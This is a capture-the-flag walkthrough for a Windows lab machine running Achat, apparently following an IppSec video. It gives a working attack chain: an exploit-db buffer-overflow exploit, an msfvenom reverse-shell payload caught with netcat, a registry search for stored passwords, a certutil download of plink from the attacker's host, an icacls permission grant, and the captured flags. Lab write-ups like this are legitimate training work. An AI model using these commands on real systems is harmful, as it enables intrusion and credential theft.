@@ -1,0 +1,109 @@
+I following the Youtube video: https://www.youtube.com/watch?v=_dRrvJNdP-s&t=44s&ab_channel=IppSec
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+We start with a scan: sudo nmap -sC -sV -p- --min-rate 5000 (target ip)
+
+We can see that an app called Achat is running on this windows machine. 
+
+By using searchsploit tool, which gets its information from Exploit-db.com, we can search for known exploits for this app,so we do: searchsploit Achat.
+
+We see four results and only two of them are related to Achat.
+
+Both of these exploits are remote buffer overflow exploits, but what is that?
+
+Remote Buffer Overflow:A remote buffer overflow is a type of software vulnerability that occurs when a remote attacker sends more data to a target system than it can handle, causing that data to overflow into adjacent memory areas. This can lead to various consequences, including system crashes, unauthorized access, and potential execution of arbitrary code.
+
+Buffer overflow vulnerabilities often occur in programs that do not properly validate the size of input data before storing it in a fixed-size buffer in memory. When an attacker sends a larger amount of data than the buffer can accommodate, the excess data overflows into adjacent memory regions, overwriting critical information such as return addresses or function pointers.
+
+In the case of a remote buffer overflow, the attacker can exploit this vulnerability by sending malicious data over a network connection to a vulnerable service or application running on the target system. By carefully crafting the input, the attacker can overwrite important memory locations and potentially gain control of the target system or execute arbitrary code with the privileges of the vulnerable process.
+
+
+We are going to use the exploit that doesnt use Metasploit for now.
+
+We download the exploit.
+
+we do : searchsploit -m (exploit path)
+
+We open the file that we downloaded. In line 57, we replace the ip address with the target machine ip address.
+
+At the top of the python file, we will find the payload in comments. We will change this payload to: msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=(our ip address) LPORT=(any port we want) -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
+
+We copy this payload  and we run it on our cmd.
+
+We will get a new payload. We will copy it and replace it instead of the one that already exist in the python folder.
+
+In a new cmd tab we run netcat to be listening to the port that we just specified in the python file. We do: nc -nvlp (port)
+
+We go back where we downloaded the python file and we run it after saving our changes. We do: python2 (file name)
+
+We come back to the cmd tab where we run netcat and we find that we now have access to the target machine.
+
+user flag will be found in C:\Users\Alfred\Desktop\user.txt.
+
+User flag: 148866c69c10d8979af95eb34cd0df2f
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Privilage Escilation: 
+
+Doing a qucik netstat check: netstat -ano. We find that the machine is listening locally on port tcp/445 which is a SMB port. 
+
+We do a search for passwords in the registry: reg query HKLM /f password /t REG_SZ /s
+
+By scrolling down for a bit, we find that there is a password:"Welcome1!". 
+
+If we searched in the Windows autologin: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" . We can see that the password that we got belongs to Alfred.
+
+Our next objective is to try to do port forwarding attack on port 445. 
+
+To do that, we need first to download plink.exe plutty. We download the 32-bit version of the plink.exe (a command-line interface to the PuTTY back ends) from this website: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+
+We open a new tab where downloaded plink, and we do the following: python3 -m http.server 80
+
+In the target machine, we go to : c:\users\alfred where we are going to download the plink.exe file. We do this by: certutil -urlcache -f http://(our ip address)/plink.exe plink.exe
+
+After, succesfully uploading the plink.exe into our target machine. We go to our machine cmd and we need to edit ssh file. We do that by : sudo gedit /etc/ssh/sshd_config
+
+This will open a file. In line 33, we need to uncomment it and change it to : PermitRootLogin yes.
+
+We restart and start ssh by : service ssh restart. Then, service ssh start.
+
+Back to our target machine, We run plink.exe by: plink.exe -l (our user name) -pw (our password) -R 445:127.0.0.1:445 (our ip address)
+
+-l: username
+-pw:password
+-R:port forward
+
+
+
+I have tried a lot but this way is not working. I will try another way.
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+We can grant Alfred full access to the root.txt file which has the flag. This way only works because alfred has access to the admin desktop. Yes we didnt escalate our privilages to be Admin but this is good enough. 
+
+We change our directory to: C:\Users\Administrator\Desktop
+
+There, we do: icacls "root.txt" /grant Alfred:(F)
+
+We now can read the root.txt file.
+
+Admin flag: aa36cb9341526e0b253f41bd8e36c7d6
+
+//END 
+
+
+
+
+
+
+
+
+
+
+
+
